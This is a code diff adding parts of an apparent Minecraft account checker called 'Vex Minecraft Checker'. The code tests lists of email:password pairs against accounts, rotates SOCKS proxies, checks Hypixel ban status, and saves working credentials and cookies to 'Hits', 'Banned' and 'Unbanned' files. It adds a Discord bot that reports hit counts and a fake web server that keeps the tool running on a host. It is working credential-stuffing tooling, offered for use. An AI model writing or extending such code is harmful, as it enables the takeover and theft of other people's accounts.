@@ -371,3 +371,159 @@ class Capture:
                                 self.banned = str(data)
                             with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                             self.save_cookies('Banned')
+                            banned_count += 1
+                    except Exception as e:
+                        self.banned = f"Error parsing: {str(e)}"
+                    finally:
+                        try:
+                            connection.disconnect()
+                        except:
+                            pass
+
+                @connection.listener(clientbound.play.JoinGamePacket)
+                def joined_game(packet):
+                    global unbanned
+                    self.banned = "False"
+                    with open(f"results/{fname}/Unbanned.txt", 'a') as f:
+                        f.write(f"{self.email}:{self.password}\n")
+                    self.save_cookies('Unbanned')
+                    unbanned += 1
+                    try:
+                        connection.disconnect()
+                    except:
+                        pass
+
+                try:
+                    # Optional proxy support for ban check
+                    if banproxies:
+                        proxy = random.choice(banproxies)
+                        if proxy:
+                            try:
+                                host, port = proxy.split(":")
+                                socks.set_default_proxy(socks.SOCKS5, host, int(port))
+                                socket.socket = socks.socksocket
+                            except:
+                                pass
+
+                    connection.connect()
+                    time.sleep(3)
+                    try:
+                        connection.disconnect()
+                    except:
+                        pass
+                    break
+                except Exception as e:
+                    tries += 1
+                    if tries >= max_ban_retries:
+                        self.banned = "Unknown"
+                    time.sleep(1)
+                finally:
+                    socket.socket = original_socket
+
+    def handle(self):
+        """Run all capture checks"""
+        try:
+            self.hypixel()
+            self.optifine()
+            self.full_access()
+            self.namechange()
+            if config.get('hypixelban'):
+                self.ban(self.session)
+            self.notify()
+            # Save hit
+            try:
+                os.makedirs(f"results/{fname}", exist_ok=True)
+                with open(f"results/{fname}/Hits.txt", 'a') as f:
+                    f.write(f"{self.email}:{self.password} | {self.name} | Banned: {self.banned}\n")
+            except:
+                pass
+        except Exception as e:
+            global errors
+            errors += 1
+            traceback.print_exc()
+
+
+# ==================== HELPER FUNCTIONS ====================
+def getproxy():
+    if not proxylist:
+        return None
+    proxy = random.choice(proxylist)
+    if not proxy:
+        return None
+    return {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
+    }
+
+
+def ensure_dirs():
+    """Create results directories (Linux safe)"""
+    global fname
+    if not fname:
+        fname = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    os.makedirs(f"results/{fname}", exist_ok=True)
+    os.makedirs(f"results/{fname}/Cookies", exist_ok=True)
+    os.makedirs(f"results/{fname}/Cookies/Banned", exist_ok=True)
+    os.makedirs(f"results/{fname}/Cookies/Unbanned", exist_ok=True)
+
+
+# ==================== FAKE WEB SERVER FOR RENDER ====================
+from flask import Flask
+from threading import Thread
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Vex Minecraft Checker is online ✅", 200
+
+@app.route("/health")
+def health():
+    return "OK", 200
+
+def run_web():
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port, threaded=True)
+
+
+# ==================== DISCORD BOT (minimal) ====================
+load_dotenv()
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f"✅ Logged in as {bot.user}")
+    ensure_dirs()
+    print(f"📁 Results folder: results/{fname}")
+
+@bot.command()
+async def ping(ctx):
+    await ctx.send("Pong! Bot is alive.")
+
+@bot.command()
+async def status(ctx):
+    await ctx.send(f"Checked: {checked} | Hits: {hits} | Banned: {banned_count} | Unbanned: {unbanned} | Errors: {errors}")
+
+
+# ==================== MAIN ====================
+if __name__ == "__main__":
+    # Create folders
+    ensure_dirs()
+
+    # Start fake web server (keeps Render happy)
+    web_thread = Thread(target=run_web, daemon=True)
+    web_thread.start()
+    print(f"🌐 Fake web server started on port {os.environ.get('PORT', 10000)}")
+
+    # Start Discord bot
+    token = os.getenv("DISCORD_TOKEN")
+    if not token:
+        print("❌ DISCORD_TOKEN not set in environment variables!")
+        # Keep the web server alive even without token
+        while True:
+            time.sleep(60)
+    else:
+        bot.run(token)
